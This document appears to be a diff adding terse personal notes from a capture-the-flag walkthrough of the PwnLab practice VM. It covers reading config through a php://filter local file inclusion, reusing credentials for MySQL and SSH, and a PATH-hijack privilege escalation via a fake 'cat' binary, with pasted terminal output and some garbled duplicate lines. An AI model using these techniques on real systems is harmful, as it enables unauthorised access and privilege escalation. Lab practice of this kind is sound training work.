@@ -1,0 +1,39 @@
+php filter using php://filter/convert.base64-encode/resource=config
+use php filter too
+
+get creds for ssh
+
+mysql login remote use root account
+
+ncat /root
+
+kane@pwnlab:~$ ./msgmike
+
+./msgmike
+
+cat: /home/mike/msg.txt: No such file or directory
+kane@pwnlab:~$ cd /tmp
+
+kane@pwnlab:/tmp$ chmod 777 cat
+
+chmod 777 cat
+
+kane@pwnlab:/tmp$ export PATH=/tmp:$PATH
+
+export PATH=/tmp:$PATH
+
+kane@pwnlab:/tmp$ cd && ./msgmike
+
+cd 66 ./msgmike
+
+mike@pwnlab:~$ id
+
+id
+
+uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
+mike@pwnlab:~$ [|
+
+
+
+
+it was printing cat so exploited it .. root  was ezy
